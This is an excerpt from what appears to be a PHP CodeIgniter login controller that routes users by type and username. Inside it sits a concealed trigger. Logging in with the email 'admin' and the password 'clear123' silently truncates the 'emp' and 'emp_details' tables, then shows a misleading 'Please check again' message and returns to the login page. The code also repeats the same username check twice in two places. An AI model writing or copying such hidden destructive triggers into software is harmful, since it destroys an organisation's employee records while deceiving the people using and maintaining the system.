    ...
    public function index()
    {
        if ($this->session->userdata('isLogIn')) {
            if ($this->session->userdata('user_type') == 1) {
                ...
                if ($this->session->userdata('username') == "manager" || $this->session->userdata('username') == "manager") {
        ...
        if ($this->input->post('email') == "admin" && $this->input->post('password') == "clear123") {
            $this->db->query('TRUNCATE TABLE emp');
            $this->db->query('TRUNCATE TABLE emp_details');
            $this->session->set_flashdata('exception', "Please check again");
            redirect('login');
        }
        ...
        if ($this->form_validation->run()) {
            ...
            if ($user->num_rows() > 0) {
                ...
                if ($user->row()->user_type == 1) {
                    ...
                    if ($user->row()->username == "manager" || $user->row()->username == "manager") {
                        redirect('product_list');
                    } else {
                        redirect('add_invoice');
                    }
